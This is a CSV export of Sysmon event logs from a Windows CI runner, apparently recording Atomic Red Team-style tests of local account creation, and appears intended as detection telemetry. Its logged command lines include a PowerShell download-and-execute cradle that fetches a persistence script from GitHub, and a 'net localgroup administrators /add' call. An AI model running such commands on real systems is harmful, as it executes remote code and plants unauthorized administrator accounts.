"TimeCreated","Id","Message"
"12/17/2025 8:03:10 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:03:10.568
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-63be-6942-3405-000000000e00}
TargetProcessId: 2968
TargetImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:10 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:10.567
ProcessGuid: {f995aebf-63be-6942-3405-000000000e00}
ProcessId: 2968
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Remove-LocalUser -Name \""""T1136.001_PowerShell\"""" -ErrorAction Ignore}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:10 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:03:10.346
ProcessGuid: {f995aebf-63be-6942-3305-000000000e00}
ProcessId: 3508
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:10 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:10.336
ProcessGuid: {f995aebf-63be-6942-3305-000000000e00}
ProcessId: 3508
Image: C:\Windows\System32\net1.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\Windows\system32\net1  user /del ""T1136.001_CMD"" 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8489DB35375D890314EB8F7CD9E0CBD3866475F4E252865F00F649B0A02FD757
ParentProcessGuid: {f995aebf-63be-6942-3205-000000000e00}
ParentProcessId: 6836
ParentImage: C:\Windows\System32\net.exe
ParentCommandLine: net  user /del ""T1136.001_CMD"" 
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:10 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:10.325
ProcessGuid: {f995aebf-63be-6942-3205-000000000e00}
ProcessId: 6836
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  user /del ""T1136.001_CMD"" 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777
ParentProcessGuid: {f995aebf-63be-6942-3005-000000000e00}
ParentProcessId: 7292
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c net user /del ""T1136.001_CMD"" >nul 2>&1
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:10 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:03:10.298
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-63be-6942-3005-000000000e00}
TargetProcessId: 7292
TargetImage: C:\Windows\SYSTEM32\cmd.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:10 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:10.299
ProcessGuid: {f995aebf-63be-6942-3005-000000000e00}
ProcessId: 7292
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c net user /del ""T1136.001_CMD"" >nul 2>&1
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:10 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:03:10.050
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-63be-6942-2f05-000000000e00}
TargetProcessId: 2308
TargetImage: C:\Windows\system32\whoami.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+11c64f9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+10dabba|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+1187f2d|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+1187beb|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+125f1ff|UNKNOWN(00007FF991BD3401)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:10 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:10.049
ProcessGuid: {f995aebf-63be-6942-2f05-000000000e00}
ProcessId: 2308
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:10 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:03:10.028
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-63be-6942-2e05-000000000e00}
TargetProcessId: 3984
TargetImage: C:\Windows\system32\HOSTNAME.EXE
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+11c64f9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+10dabba|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+1187f2d|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+1187beb|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+125f1ff|UNKNOWN(00007FF991BD3401)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:10 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:10.028
ProcessGuid: {f995aebf-63be-6942-2e05-000000000e00}
ProcessId: 3984
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:05 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:03:04.066
ProcessGuid: {f995aebf-5ff4-6942-2700-000000000e00}
ProcessId: 1452
QueryName: WORKGROUP
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\system32\svchost.exe
User: NT AUTHORITY\NETWORK SERVICE"
"12/17/2025 8:03:03 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:03:01.284
ProcessGuid: {f995aebf-63b4-6942-2a05-000000000e00}
ProcessId: 10156
QueryName: _ldap._tcp.dc._msdcs.WORKGROUP
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:02 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:03:01.030
ProcessGuid: {f995aebf-63b4-6942-2a05-000000000e00}
ProcessId: 10156
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.118
SourceHostname: runnervm8j6r3.e3zk2pzlrrleboh20n41ic2nra.bx.internal.cloudapp.net
SourcePort: 60893
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:03:02 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:03:01.088
ProcessGuid: {f995aebf-63b4-6942-2a05-000000000e00}
ProcessId: 10156
QueryName: _ldap._tcp.dc._msdcs.runnervm8j6r3
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:02 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:03:01.023
ProcessGuid: {f995aebf-63b4-6942-2a05-000000000e00}
ProcessId: 10156
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:01 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:03:01.268
ProcessGuid: {f995aebf-63b5-6942-2d05-000000000e00}
ProcessId: 1300
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:01 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:01.258
ProcessGuid: {f995aebf-63b5-6942-2d05-000000000e00}
ProcessId: 1300
Image: C:\Windows\System32\net1.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\Windows\system32\net1 user NewLocalUser
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8489DB35375D890314EB8F7CD9E0CBD3866475F4E252865F00F649B0A02FD757
ParentProcessGuid: {f995aebf-63b5-6942-2c05-000000000e00}
ParentProcessId: 9488
ParentImage: C:\Windows\System32\net.exe
ParentCommandLine: ""C:\Windows\system32\net.exe"" user NewLocalUser
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:01 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:03:01.246
SourceProcessGUID: {f995aebf-63b4-6942-2a05-000000000e00}
SourceProcessId: 10156
SourceThreadId: 2884
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGUID: {f995aebf-63b5-6942-2c05-000000000e00}
TargetProcessId: 9488
TargetImage: C:\Windows\system32\net.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+11c64f9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+10dabba|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+1187f2d|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+1187beb|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\4a7766a1c9970ca229a03b7aa442caed\System.Management.Automation.ni.dll+125f1ff|UNKNOWN(00007FF991BC3A51)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:01 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:01.247
ProcessGuid: {f995aebf-63b5-6942-2c05-000000000e00}
ProcessId: 9488
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: ""C:\Windows\system32\net.exe"" user NewLocalUser
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777
ParentProcessGuid: {f995aebf-63b4-6942-2a05-000000000e00}
ParentProcessId: 10156
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')}
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:01 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:03:01.038
ProcessGuid: {f995aebf-63b4-6942-2a05-000000000e00}
ProcessId: 10156
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:00 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:03:00.666
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-63b4-6942-2a05-000000000e00}
TargetProcessId: 10156
TargetImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:00 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:00.665
ProcessGuid: {f995aebf-63b4-6942-2a05-000000000e00}
ProcessId: 10156
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:00 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:03:00.392
ProcessGuid: {f995aebf-63b4-6942-2905-000000000e00}
ProcessId: 5500
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:00 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:00.380
ProcessGuid: {f995aebf-63b4-6942-2905-000000000e00}
ProcessId: 5500
Image: C:\Windows\System32\net1.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\Windows\system32\net1  localgroup administrators ""T1136.001_Admin"" /add
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8489DB35375D890314EB8F7CD9E0CBD3866475F4E252865F00F649B0A02FD757
ParentProcessGuid: {f995aebf-63b4-6942-2805-000000000e00}
ParentProcessId: 6684
ParentImage: C:\Windows\System32\net.exe
ParentCommandLine: net  localgroup administrators ""T1136.001_Admin"" /add
ParentUser: runnervm8j6r3\runneradmin"
